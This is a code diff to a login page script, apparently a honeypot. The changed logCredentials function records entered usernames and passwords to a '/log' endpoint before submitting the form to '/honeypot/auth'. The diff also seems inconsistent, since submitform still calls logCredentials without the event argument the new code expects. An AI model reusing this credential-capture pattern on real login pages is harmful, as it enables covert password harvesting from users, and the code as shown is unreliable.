@@ -21,8 +21,9 @@
     
     <script language="javascript" type="text/javascript">
         // Define the logCredentials function
-        async function logCredentials() {
+        async function logCredentials(event) {
           try {
+              event.preventDefault(); // Prevent default form submission
               const username = document.getElementById("username").value;
               const password = document.getElementById("password").value;
               const response = await fetch("/log", {
@@ -34,6 +35,9 @@
               });
               if (response.ok) {
                   console.log("Credentials logged successfully.");
+                  // Submit the form after successful logging
+                  document.loginData.action = "/honeypot/auth";
+                  document.loginData.submit();
               } else {
                   throw new Error(`Error logging credentials: ${response.statusText}`);
               }
@@ -41,7 +45,7 @@
               console.error("Error logging credentials:", error.message);
           }
       }
-        
+
         // Define the submitform function
         function submitform() {
             logCredentials();
